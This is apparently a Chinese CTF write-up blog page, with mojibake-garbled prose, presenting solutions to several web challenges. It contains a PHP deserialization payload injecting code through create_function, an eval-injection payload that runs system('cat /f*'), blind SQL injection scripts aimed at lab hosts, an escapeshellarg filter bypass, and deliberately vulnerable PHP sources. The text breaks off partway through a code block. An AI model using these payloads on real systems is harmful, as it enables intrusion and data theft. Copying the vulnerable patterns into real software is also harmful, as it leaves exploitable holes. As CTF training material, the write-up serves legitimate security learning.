ï¼Œä½†æ˜¯ä¸èƒ½è§¦å‘æ­£åˆ™ï¼Œè¿™é‡Œä½¿ç”¨create_function()å‡½æ•°ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="string">&quot;Nice Job!!&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> A;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> B;</span><br><span class="line"><span class="variable">$b</span>-&gt;func = <span class="string">&quot;create_function&quot;</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;arg = <span class="string">&quot;&#125;var_dump(get_defined_vars());//&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="keyword">var</span> = <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">print</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯flagä¸åœ¨è¿™é‡Œ</p><p><img src="/../images/image-20240123201250793.png" alt="image-20240123201250793"></p><p>æˆ‘ä»¬åœ¨è¿™ä¸ªè¯­å¥çš„åŸºç¡€ä¸ŠåŒ…å«_Tru3flag.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$b</span>-&gt;arg = <span class="string">&quot;&#125;require(base64_decode(VHJ1M2ZsYWcucGhw));var_dump(get_defined_vars());//&quot;</span>;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20240123201453046.png" alt="image-20240123201453046"></p><h1 id="NewStarCTF-å…¬å¼€èµ›èµ›é“-NotPHP"><a href="#NewStarCTF-å…¬å¼€èµ›èµ›é“-NotPHP" class="headerlink" title="[NewStarCTF å…¬å¼€èµ›èµ›é“]NotPHP"></a>[NewStarCTF å…¬å¼€èµ›èµ›é“]NotPHP</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]) == <span class="string">&quot;Welcome to CTF&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>] !== <span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>])&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]) == <span class="number">2077</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Hack Me&quot;</span>;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;#&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Number error!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Wrong Key!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Pass it!&quot;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>ä»ä¸Šå¾€ä¸‹çœ‹ï¼Œdataå‚æ•°ä½¿ç”¨dataä¼ªåè®®ï¼Œkey1å’Œkey2è¿™é‡Œä½¿ç”¨æ•°ç»„ç»•è¿‡ï¼Œnum&#x3D;2077aï¼Œæœ€åçš„cmdç”±äºå‰é¢æ‹¼æ¥äº†#ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™é‡Œéœ€è¦é—­åˆï¼Œç„¶åä½¿ç”¨çŸ­æ ‡ç­¾å‘½ä»¤æ‰§è¡Œ</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?data=data://text/plain;base64,V2VsY29tZSB0byBDVEY&amp;key1[]=1&amp;key2[]=2</span><br><span class="line">&amp;cmd=?&gt;&lt;?=system(&#x27;cat /f*&#x27;);</span><br><span class="line">POST:</span><br><span class="line">num=2077a</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20240123204927465.png" alt="image-20240123204927465"></p><h1 id="VNCTF2022å…¬å¼€èµ›-gocalc0"><a href="#VNCTF2022å…¬å¼€èµ›-gocalc0" class="headerlink" title="[VNCTF2022å…¬å¼€èµ›]gocalc0"></a>[VNCTF2022å…¬å¼€èµ›]gocalc0</h1><p>æç¤º</p><p><img src="/../images/image-20240123205637244.png" alt="image-20240123205637244"></p><p>æŠ“åŒ…çœ‹ä¸‹session</p><p><img src="/../images/image-20240123205806380.png" alt="image-20240123205806380"></p><p>base64è§£ç </p><p><img src="/../images/image-20240123205855734.png" alt="image-20240123205855734"></p><p>äºŒæ¬¡è§£ç å¾—åˆ°flag</p><p><img src="/../images/image-20240123205916852.png" alt="image-20240123205916852"></p><h1 id="NewStarCTF-å…¬å¼€èµ›èµ›é“-åˆä¸€ä¸ªSQL"><a href="#NewStarCTF-å…¬å¼€èµ›èµ›é“-åˆä¸€ä¸ªSQL" class="headerlink" title="[NewStarCTF å…¬å¼€èµ›èµ›é“]åˆä¸€ä¸ªSQL"></a>[NewStarCTF å…¬å¼€èµ›èµ›é“]åˆä¸€ä¸ªSQL</h1><p>ç›²æ³¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">url = <span class="string">&#x27;http://fdde551b-f67f-4f8d-b7c0-3bb8bac4b95c.node5.buuoj.cn:81/comments.php&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">d = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> d == <span class="number">0</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">128</span></span><br><span class="line">    <span class="keyword">while</span> low &lt; high:</span><br><span class="line">        l = (low + high) // <span class="number">2</span></span><br><span class="line">        <span class="comment"># payload = f&quot;1^(ascii(substr((select(database())),&#123;i&#125;,1))&gt;&#123;l&#125;)&quot;</span></span><br><span class="line">        <span class="comment"># payload = f&quot;1^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),&#123;i&#125;,1))&gt;&#123;l&#125;)+&#x27;0&quot;</span></span><br><span class="line">        <span class="comment"># payload = f&quot;1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),&#123;i&#125;,1))&gt;&#123;l&#125;)&quot;</span></span><br><span class="line">        <span class="comment"># payload = f&quot;1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;wfy_comments&#x27;)),&#123;i&#125;,1))&gt;&#123;l&#125;)&quot;</span></span><br><span class="line">        payload = <span class="string">f&quot;1^(ascii(substr((select(text)from(wfy_comments)where(user=&#x27;f1ag_is_here&#x27;)),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;l&#125;</span>)&quot;</span></span><br><span class="line">        da = &#123;</span><br><span class="line">            <span class="string">&quot;name&quot;</span>: payload</span><br><span class="line">        &#125;</span><br><span class="line">        r = s.post(url=url, data=da)</span><br><span class="line">        r.encoding = <span class="string">&quot;utf-8&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;è€¶&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            high = l</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            low = l + <span class="number">1</span></span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="keyword">if</span> low != <span class="number">32</span>:</span><br><span class="line">        flag += <span class="built_in">chr</span>(low)</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20240124095545083.png" alt="image-20240124095545083"></p><h1 id="GYCTF2020-Ezsqli"><a href="#GYCTF2020-Ezsqli" class="headerlink" title="[GYCTF2020]Ezsqli"></a>[GYCTF2020]Ezsqli</h1><p>ç›²æ³¨ï¼Œè¿™é¢˜çš„å…³é”®æ˜¯è¿‡æ»¤äº†information_schemaï¼Œè¿™é‡Œç”¨sys.schema_table_statistics_with_bufferæ¥ä»£æ›¿</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://afba0620-aebf-4598-9b5a-2125e527007e.node5.buuoj.cn:81/index.php&quot;</span></span><br><span class="line">payload=<span class="string">&quot;1&amp;&amp;ascii(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database()),&#123;&#125;,1))=&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">result=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">500</span>):</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">py=payload.<span class="built_in">format</span>(j,i)</span><br><span class="line">data=&#123;<span class="string">&#x27;id&#x27;</span>:py&#125;</span><br><span class="line">r=requests.post(url=url,data=data)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;Nu1l&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">result+=<span class="built_in">chr</span>(i)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://8e176081-905d-4063-a906-4eed1f03ed17.node3.buuoj.cn/index.php&#x27;</span></span><br><span class="line">payload=<span class="string">&#x27;1&amp;&amp;((select 1,&quot;&#123;&#125;&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        hexchar=flag+<span class="built_in">chr</span>(i)</span><br><span class="line">        py=payload.<span class="built_in">format</span>(hexchar)</span><br><span class="line">        datas=&#123;<span class="string">&#x27;id&#x27;</span>:py&#125;</span><br><span class="line">        re=requests.post(url=url,data=datas)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Nu1L&#x27;</span> <span class="keyword">in</span> re.text:</span><br><span class="line">            flag+=<span class="built_in">chr</span>(i-<span class="number">1</span>)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åç§»æ³¨å…¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">&#x27;1&amp;&amp;((select 1,&quot;&#123;&#125;&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&#x27;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œéå†äº†æ‰€æœ‰çš„å­—ç¬¦ä¸flagæ¯ä¸ªå€¼è¿›è¡Œæ¯”è¾ƒï¼Œæ»¡è¶³æ¡ä»¶è¿”å›nu1lå¹¶ä¸”è¾“å‡ºè¿™ä¸ªå­—ç¬¦</p><h1 id="NewStarCTF-å…¬å¼€èµ›èµ›é“-Whats-HTTP"><a href="#NewStarCTF-å…¬å¼€èµ›èµ›é“-Whats-HTTP" class="headerlink" title="[NewStarCTF å…¬å¼€èµ›èµ›é“]Whats HTTP"></a>[NewStarCTF å…¬å¼€èµ›èµ›é“]Whats HTTP</h1><p>æ–‡ä»¶-&gt;å¯¼å‡ºå¯¹è±¡-&gt;HTTP</p><p><img src="/../images/image-20240124224523505.png" alt="image-20240124224523505"></p><p>ç„¶åæ‰“å¼€sssssercetæ–‡ä»¶</p><p><img src="/../images/image-20240124224440046.png" alt="image-20240124224440046"></p><p>base64-&gt;hex</p><p><img src="/../images/image-20240124224456065.png" alt="image-20240124224456065"></p><h1 id="VNCTF2021-Ez-game"><a href="#VNCTF2021-Ez-game" class="headerlink" title="[VNCTF2021]Ez_game"></a>[VNCTF2021]Ez_game</h1><p>F12æŸ¥çœ‹</p><p><img src="/../images/image-20240125195347598.png" alt="image-20240125195347598"></p><p>æ§åˆ¶å°è¿è¡Œ</p><p><img src="/../images/image-20240125195407412.png" alt="image-20240125195407412"></p><h1 id="2021DASCTFå®æˆ˜ç²¾è‹±å¤ä»¤è¥æš¨DASCTF-July-X-CBCTF-4th-cat-flag"><a href="#2021DASCTFå®æˆ˜ç²¾è‹±å¤ä»¤è¥æš¨DASCTF-July-X-CBCTF-4th-cat-flag" class="headerlink" title="[2021DASCTFå®æˆ˜ç²¾è‹±å¤ä»¤è¥æš¨DASCTF July X CBCTF 4th]cat flag"></a>[2021DASCTFå®æˆ˜ç²¾è‹±å¤ä»¤è¥æš¨DASCTF July X CBCTF 4th]cat flag</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag/i&#x27;</span>,<span class="variable">$cmd</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$cmd</span> = <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$cmd</span>);</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat &#x27;</span> . <span class="variable">$cmd</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¯¹å‚æ•°cmdè¿›è¡Œæ­£åˆ™è¿‡æ»¤ï¼Œå¹¶ä¸”ä½¿ç”¨å‡½æ•°å¯¹cmdå¢åŠ å•å¼•å·ã€‚</p><p>é¢˜ç›®æç¤ºç®¡ç†å‘˜æ›¾ç»è®¿é—®flagï¼ŒæŸ¥çœ‹&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.logæ—¥å¿—</p><p><img src="/../images/image-20240125200148211.png" alt="image-20240125200148211"></p><p>è¿™é‡Œç»™å‡ºäº†flagæ‰€åœ¨æ–‡ä»¶ï¼Œä½†æ˜¯éœ€è¦ç»•è¿‡æ­£åˆ™åŒ¹é…ï¼Œè€Œescapeshellarg()ä¼šå¿½è§†éASCIIå­—ç¬¦</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=this_is_final_fla%8cg_e2a457126032b42d.php</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20240125200342437.png" alt="image-20240125200342437"></p><h1 id="2021DASCTFå®æˆ˜ç²¾è‹±å¤ä»¤è¥æš¨DASCTF-July-X-CBCTF-4th-ezrce"><a href="#2021DASCTFå®æˆ˜ç²¾è‹±å¤ä»¤è¥æš¨DASCTF-July-X-CBCTF-4th-ezrce" class="headerlink" title="[2021DASCTFå®æˆ˜ç²¾è‹±å¤ä»¤è¥æš¨DASCTF July X CBCTF 4th]ezrce"></a>[2021DASCTFå®æˆ˜ç²¾è‹±å¤ä»¤è¥æš¨DASCTF July X CBCTF 4th]ezrce</h1><p>é¢˜ç›®æç¤ºäº†node.jsï¼Œå¹¶ä¸”åº•éƒ¨å¯ä»¥çœ‹åˆ°YApiå’Œç‰ˆæœ¬1.9.2</p><p><img src="/../images/image-20240125200709176.png" alt="image-20240125200709176"></p><p>æ‰¾åˆ°å†å²æ¼æ´<a href="https://blog.csdn.net/Trouble_99/article/details/118667625">https://blog.csdn.net/Trouble_99/article/details/118667625</a></p><p>æ³¨å†Œç™»å½•ï¼Œæ–°å»ºé¡¹ç›®ï¼Œè®¾ç½®å…¨å±€mockè„šæœ¬</p><p><img src="/../images/image-20240125201251323.png" alt="image-20240125201251323"></p><p>æ·»åŠ æ¥å£</p><p><img src="/../images/image-20240125201430247.png" alt="image-20240125201430247"></p><p>è®¿é—®mockåœ°å€</p><p><img src="/../images/image-20240125201443038.png" alt="image-20240125201443038"></p><p>å°†è„šæœ¬æ”¹ä¸ºæŸ¥çœ‹flag</p><p><img src="/../images/image-20240125201516404.png" alt="image-20240125201516404"></p><h1 id="DASCTF-Sept-X-æµ™æ±Ÿå·¥ä¸šå¤§å­¦ç§‹å­£æŒ‘æˆ˜èµ›-ctfmanage"><a href="#DASCTF-Sept-X-æµ™æ±Ÿå·¥ä¸šå¤§å­¦ç§‹å­£æŒ‘æˆ˜èµ›-ctfmanage" class="headerlink" title="[DASCTF Sept X æµ™æ±Ÿå·¥ä¸šå¤§å­¦ç§‹å­£æŒ‘æˆ˜èµ›]ctfmanage"></a>[DASCTF Sept X æµ™æ±Ÿå·¥ä¸šå¤§å­¦ç§‹å­£æŒ‘æˆ˜èµ›]ctfmanage</h1><p>æ‰“å¼€ç¯å¢ƒåF12æŸ¥çœ‹æºç </p><p><img src="/../images/image-20240126124806713.png" alt="image-20240126124806713"></p><p>gg.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">bin2hex</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sy&#x27;</span>]))))===<span class="variable">$secret</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ha&#x27;</span>]!==<span class="variable">$_POST</span>[<span class="string">&#x27;lo&#x27;</span>]&amp;&amp;<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ha&#x27;</span>])===<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;lo&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;ohhhhh so close !!!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„secretå°±æ˜¯åˆšæ‰çš„ç§˜å¯†ï¼Œå¯¹å…¶è¿›è¡Œbase64è§£å¯†-&gt;base16åŠ å¯†-&gt;åè½¬-&gt;base16è§£å¯†å¾—åˆ°ilovectfverymuch</p><p>POSTä¼ å‚æ•°ç»„ç»•è¿‡</p><p><img src="/../images/image-20240126125751660.png" alt="image-20240126125751660"></p><h1 id="DASCTF-Oct-X-å‰æ—å·¥å¸ˆ-æ¬¢è¿æ¥åˆ°é­”æ³•ä¸–ç•Œï½-è¿·è·¯çš„é­”æ³•å°‘å¥³"><a href="#DASCTF-Oct-X-å‰æ—å·¥å¸ˆ-æ¬¢è¿æ¥åˆ°é­”æ³•ä¸–ç•Œï½-è¿·è·¯çš„é­”æ³•å°‘å¥³" class="headerlink" title="[DASCTF Oct X å‰æ—å·¥å¸ˆ æ¬¢è¿æ¥åˆ°é­”æ³•ä¸–ç•Œï½]è¿·è·¯çš„é­”æ³•å°‘å¥³"></a>[DASCTF Oct X å‰æ—å·¥å¸ˆ æ¬¢è¿æ¥åˆ°é­”æ³•ä¸–ç•Œï½]è¿·è·¯çš„é­”æ³•å°‘å¥³</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">String2Array</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$data</span> == <span class="string">&#x27;&#x27;</span>) <span class="keyword">return</span> <span class="keyword">array</span>();</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="string">&quot;\$array = <span class="subst">$data</span>;&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$array</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$attrid</span>) &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$attrvalue</span>))</span><br><span class="line">&#123;</span><br><span class="line">        <span class="variable">$attrstr</span> .= <span class="string">&#x27;array(&#x27;</span>;</span><br><span class="line">        <span class="variable">$attrids</span> = <span class="title function_ invoke__">count</span>(<span class="variable">$attrid</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="variable">$attrids</span>; <span class="variable">$i</span>++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$attrstr</span> .= <span class="string">&#x27;&quot;&#x27;</span>.<span class="title function_ invoke__">intval</span>(<span class="variable">$attrid</span>[<span class="variable">$i</span>]).<span class="string">&#x27;&quot;=&gt;&#x27;</span>.<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$attrvalue</span>[<span class="variable">$i</span>].<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$i</span> &lt; <span class="variable">$attrids</span>-<span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$attrstr</span> .= <span class="string">&#x27;,&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span 